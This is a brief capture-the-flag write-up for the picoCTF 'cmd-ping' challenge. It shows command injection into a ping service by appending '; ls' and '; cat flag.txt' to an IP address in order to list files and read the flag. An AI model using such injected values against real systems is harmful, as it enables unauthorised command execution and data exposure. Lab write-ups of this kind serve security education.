# 🏁 picoCTF Writeup: cmd-ping

## 📌 Challenge Overview

Author: Yahaya Meddy

Description
Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?
Additional details will be available after launching your challenge instance.

💡 **Hint:** *Sometimes, You can run more than one command at a time.*

## 🔎 Step 1: Connect to the nc connection

```bash
nc mysterious-sea.picoctf.net 63803
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; ls
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.51 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=111 time=8.42 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 8.422/8.966/9.511/0.544 ms
flag.txt
script.sh

The part 8.8.8.8; ls was added in the second run

## Step 3: Get the Flag

Enter cat to display the file 
```bash
8.8.8.8; cat flag.txt